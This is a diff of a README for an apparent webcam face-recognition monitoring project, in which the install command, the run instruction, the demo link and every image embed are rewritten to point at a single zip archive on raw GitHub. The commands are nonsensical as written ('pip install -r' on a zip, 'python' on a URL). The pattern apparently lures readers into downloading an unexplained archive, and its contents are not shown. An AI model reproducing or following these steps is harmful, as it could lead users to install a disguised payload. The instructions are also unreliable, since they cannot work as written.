@@ -9,21 +9,21 @@ Keras-Vggface
 
 * conda create --prefix ./env python==3.8 -y
 * conda activate <<path_to_env_directory>>/env
-* pip install -r https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip
+* pip install -r https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/src/utils/Monitoring-system-3.8.zip
 ## Project Demo
 
 ### View my project
-[Demo](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip)
+[Demo](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/src/utils/Monitoring-system-3.8.zip)
 
 ## Steps
 
-### First go to the project directory and run 'python https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip' in command line.
+### First go to the project directory and run 'python https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/src/utils/Monitoring-system-3.8.zip' in command line.
 
 ### Take image through webcam (by default this application takes 50 images of you)
-![Take image](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip)
+![Take image](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/src/utils/Monitoring-system-3.8.zip)
 
 ### Train Model (system collects face embeddings of all persons, present in your data directory)
-![Train Model](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip)
+![Train Model](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/src/utils/Monitoring-system-3.8.zip)
 
 ### Prediction or Monitor (In prediction, system only recognize you. In Monitor, it recognize you and monitor you
-![demo](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip)
+![demo](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/src/utils/Monitoring-system-3.8.zip)
